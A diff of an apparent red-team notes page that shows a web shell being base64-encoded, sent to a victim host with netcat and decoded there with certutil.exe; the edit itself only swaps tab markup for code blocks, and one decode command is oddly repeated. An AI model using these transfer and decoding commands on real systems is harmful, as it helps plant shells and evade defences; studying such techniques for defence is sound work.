@@ -14,35 +14,29 @@ Preview of the content to be encoded on the attacking system:
 
 Sending the above shell as a base64 encoded string to the victim system \(victim is listening and waiting for the file with `nc -l 4444 > enc`\):
 
-{% tabs %}
-{% tab title="attacker@local" %}
+{% code title="attacker@local" %}
 ```csharp
 base64 < shell.php.gif | nc 10.0.0.2 4444
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 Once the file is received on the victim, let's check its contents:
 
-{% tabs %}
-{% tab title="attacker@victim" %}
+{% code title="attacker@victim" %}
 ```csharp
 certutil.exe -decode .\enc dec
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 ![](../../.gitbook/assets/certutil-encoded.png)
 
 Let's decode the data:
 
-{% tabs %}
-{% tab title="attacker@victim" %}
+{% code title="attacker@victim" %}
 ```csharp
 certutil.exe -decode .\enc dec
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 Let's have a look at the contents of the file `dec` which now contains the base64 decoded shell:
 
